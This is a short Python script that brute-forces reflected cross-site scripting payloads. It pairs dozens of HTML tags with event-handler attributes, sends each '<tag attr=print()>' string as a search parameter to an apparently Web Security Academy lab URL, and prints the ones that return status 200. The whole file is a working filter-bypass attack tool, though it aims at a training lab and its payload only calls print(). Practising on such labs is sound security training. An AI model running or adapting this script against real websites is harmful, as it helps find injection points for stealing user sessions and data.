import requests as req

#list of attribute that we able to use after bruteforce attribute
attribute = {"onratechange","onscrollend","onbeforeinput","onresize"}

#list of tags that possible to use
tags = {"a","abbr","acronym","address","applet","area","article","aside","audio","b","base","bdi","bdo","big","blink","blockquote","body","br","button","canvas","caption","center","cite","code","col","colgroup","command","content","data","datalist","dd","del","details","dfn","dialog","dir","div","dl","dt","element","em","embed","fieldset","figcaption","figure","font","footer","form","frame","frameset","h1","head","header","hgroup","hr","html","i","iframe","image","img","input","ins","kbd","keygen","label","legend","li","link","listing","main","map","mark","marquee","menu","menuitem","meta","meter","multicol","nav","nextid","nobr","noembed","noframes","noscript","object","ol","optgroup","option","output","p","param","picture","plaintext","pre","progress","q","rb","rp","rt","rtc","ruby","s","samp","script","section","select","shadow","slot","small","source","spacer","span","strike","strong","style","sub","summary","sup","svg","<svg><animate>","<svg><animatemotion>","<svg><animatetransform>","<svg><set>","table","tbody","td","template","textarea","tfoot","th","thead","time","title","tr","track","tt","u","ul","var","video","wbr","xmp",
}


def bruteTagAttribute(tag,attr):
    payload = f"<{tag} {attr}=print()></{tag}>"
    r = req.get(f"https://0ace000303a0e49180ffdf7a00cb0021.web-security-academy.net/?search={payload}")
    if(r.status_code == 200):
        print(payload)
    
for tag in tags:
    for attr in attribute:
        bruteTagAttribute(tag, attr)
